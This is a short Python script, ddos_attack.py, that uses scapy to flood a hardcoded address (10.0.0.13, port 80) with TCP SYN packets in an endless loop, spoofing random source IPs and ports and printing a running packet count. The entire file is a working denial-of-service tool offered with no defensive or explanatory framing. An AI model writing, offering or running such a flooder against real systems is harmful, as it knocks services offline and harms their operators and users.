# ddos_attack.py

import argparse
import random
from scapy.all import IP, TCP, send

def ddos_attack():
    target_ip = "10.0.0.13"
    dport = 80
    print(f"Starting DDoS attack on {target_ip}:{dport}")
    sent_packets = 0
    while True:
        # Generate random source IP and source port
        src_ip = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        src_port = random.randint(1024, 65535)

        # Create and send a TCP SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=dport, flags="S")
        send(packet, inter=0.001, count=1, verbose=0)
        sent_packets += 1
        if sent_packets % 1000 == 0:
            print(f"Sent {sent_packets} packets")

if __name__ == "__main__":
    ddos_attack()
